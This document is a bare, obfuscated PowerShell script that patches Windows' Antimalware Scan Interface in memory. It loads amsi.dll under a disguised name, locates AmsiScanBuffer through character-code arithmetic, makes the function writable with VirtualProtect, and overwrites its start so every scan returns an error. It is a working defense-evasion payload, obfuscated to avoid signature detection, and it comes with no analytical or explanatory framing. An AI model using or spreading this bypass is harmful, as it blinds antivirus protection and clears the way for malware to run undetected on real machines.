$Dh1ej7bGRJA6p = @"
using System;
using System.Runtime.InteropServices;
public class Dh1ej7bGRJA6p {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr PVAvlTuoDiFsYC, string eN8giH6bf6YzYWvNNTr);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr scq, UIntPtr U6bbiF6yZL, uint ePGyjhx9K, out uint Y3mjMZTqU);
}
"@

Add-Type $Dh1ej7bGRJA6p

$D60QpVJGOjmpeL = [Dh1ej7bGRJA6p]::LoadLibrary("$(('à'+'m'+'s'+'í'+'.'+'d'+'l'+'l').noRmALiZE([chaR]([bYte]0x46)+[cHaR]([Byte]0x6f)+[ChAr]([BYtE]0x72)+[CHAr]([BYTE]0x6d)+[CHaR](68+20-20)) -replace [chaR]([BYtE]0x5c)+[CHar](112+78-78)+[ChAR]([BYte]0x7b)+[CHAr](77+8-8)+[CHAr]([Byte]0x6e)+[ChAR]([byTe]0x7d))")
$A2SGsw = [Dh1ej7bGRJA6p]::GetProcAddress($D60QpVJGOjmpeL, "$([CHaR](29+36)+[CHAr](109+98-98)+[cHAR](41+74)+[cHaR](49+56)+[Char](83)+[cHaR](99+71-71)+[CHar](97)+[CHar]([Byte]0x6e)+[chAR](66*15/15)+[Char](89+28)+[Char](73+29)+[char](58+44)+[cHar](101)+[ChAR](114))")
$p = 0
[Dh1ej7bGRJA6p]::VirtualProtect($A2SGsw, [uint32]5, 0x40, [ref]$p)
$v72p1ea = "0xB8"
$TPNrX4aSasr = "0x57"
$XsYhrS = "0x00"
$Q0f0F = "0x07"
$Oxkp8JeuPP2k7sNyopt = "0x80"
$xRjEG1c = "0xC3"
$CgZ = [Byte[]] ($v72p1ea,$TPNrX4aSasr,$XsYhrS,$Q0f0F,+$Oxkp8JeuPP2k7sNyopt,+$xRjEG1c)
[System.Runtime.InteropServices.Marshal]::Copy($CgZ, 0, $A2SGsw, 6)